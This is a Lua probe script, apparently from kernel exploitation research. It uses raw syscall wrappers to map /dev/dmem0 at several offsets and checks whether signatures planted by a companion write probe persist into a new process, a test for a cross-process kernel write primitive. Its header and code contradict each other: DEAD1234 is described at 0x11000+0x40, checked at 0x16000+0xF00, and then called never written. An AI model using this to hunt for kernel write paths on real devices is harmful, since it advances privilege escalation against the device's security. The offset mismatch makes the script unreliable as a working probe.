-- CRASH_CLASS: LOW
-- PROBE 1454a: read side of the /dev/dmem persistence test (run right after 1453a)
--
-- Context:
--   1453a wrote three signatures through /dev/dmem0: 0F0F0F0F at 0xF000+0x20, DEAD1234 at
--   0x11000+0x40 and +0x44, and CAFEBABE at page0+0xBF0, and printed the values it found there
--   before writing.  This probe is a separate TCP connection, therefore a different loader process
--   (the loader spawns one per connection; the pid is printed and must differ from 1453a's).
--
--     signatures present -> the window maps memory that outlives the process: a store into it is a
--                           kernel write into memory shared across processes
--     signatures absent, originals present -> the driver copies kernel-initialised structures into
--                           per-process pages and the window is not a kernel write path
--
-- -- prior art:
--   probes/phase36_realargs/1453a_dmem_persist_write.lua   (this probe's write half)
--   results/phase36_realargs/1397g_dmem_f000_dump_20261109_143115.txt (the original header bytes)
--   results/phase36_realargs/1397i_dmem_block_checksum_20261109_143254.txt (page 0/0xF/0x11 heads)
--   docs/DMEM_WINDOW_14_10.md

print("=== PROBE 1454a: DMEM BLOCK PERSISTENCE (READ) ===")
print("")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function sgn(v) local n=N(v) if n<0 then return -1 end return n end
local function isva(v) return v > 0x10000 and v < 0x8000000000 end
local function rdd(a) local ok,v = pcall(function() return N(memory.read_dword(a)) end) if ok then return v end return nil end

local OPEN, MMAP, GETPID = mk(5), mk(477), mk(20)
local function getpid() return sgn(GETPID(uint64(0),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0))) end
local function hex(v) if v==nil then return "????????" end return string.format("%08X", v) end

local function str_addr(s)
    local b = N(memory.alloc(0x100))
    for i = 0, 0x40, 8 do pcall(function() memory.write_qword(b + i, uint64(0)) end) end
    for i = 1, #s do pcall(function() memory.write_byte(b + i - 1, uint64(string.byte(s, i))) end) end
    return b
end

local function dev_map(off)
    local p = str_addr("/dev/dmem0")
    local ok, fd = pcall(function() return OPEN(uint64(p), uint64(0x4002), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if not ok then return -1 end
    fd = sgn(fd)
    if fd < 0 then return -1 end
    local ok2, va = pcall(function()
        return MMAP(uint64(0), uint64(0x1000), uint64(3), uint64(0x1), uint64(fd), uint64(off))
    end)
    if not ok2 then return -1 end
    local n = N(va)
    if not isva(n) then return -1 end
    return n
end

print(string.format("[0] pid=%d  (1453a ran in a different process)", getpid()))
print("")

local function block(tag, off, offsets)
    local va = dev_map(off)
    if va <= 0 then print(string.format("[%s] map at 0x%X FAILED", tag, off)) return nil end
    print(string.format("[%s] offset 0x%X -> 0x%X", tag, off, va))
    local out = {}
    for i = 1, #offsets do
        out[i] = rdd(va + offsets[i])
        print(string.format("   +0x%03X = %s", offsets[i], hex(out[i])))
    end
    return out
end

local A = block("A", 0xF000, {0x00, 0x04, 0x08, 0x0C, 0x10, 0x14, 0x18, 0x1C, 0x20})
local B = block("B", 0x11000, {0x00, 0x04, 0x08, 0x0C, 0x10, 0x14, 0x18, 0x1C, 0x20, 0x2C, 0x30, 0x34, 0x38, 0x3C, 0x40, 0x44})
local C = block("C", 0x0, {0x800, 0x804, 0x808, 0x80C, 0xBF0, 0xBF4})
local D = block("D", 0x16000, {0xF00, 0xF04, 0xF08})

print("")
local hits = 0
if A and A[9] == 0x0F0F0F0F then hits = hits + 1 print("[!] SIGNATURE A survived: 0xF000+0x20 = 0F0F0F0F (was 5362724F)") end
if C and C[5] == 0xCAFEBABE then hits = hits + 1 print("[!] SIGNATURE C survived: page0+0xBF0 = CAFEBABE") end
if D and D[1] == 0xDEAD1234 then hits = hits + 1 print("[!] SIGNATURE D survived: page16+0xF00 = DEAD1234") end

print("")
if A then print(string.format("[CTRL] 0xF000+0x20 = %s (original is 5362724F)", hex(A[9]))) end
if B then print(string.format("[CTRL] 0x11000+0x40 = %s (never written; compare with 1453a)", hex(B[15]))) end
print("")
if hits > 0 then
    print(string.format("[VERDICT] %d/3 signatures survived into a different process. The /dev/dmem window maps memory that outlives a process.", hits))
else
    print("[VERDICT] 0/3 signatures survived into a different process. The driver regenerates the populated block per process; the window is not a cross-process write path.")
end
print("")
print("=== PROBE 1454a COMPLETE ===")
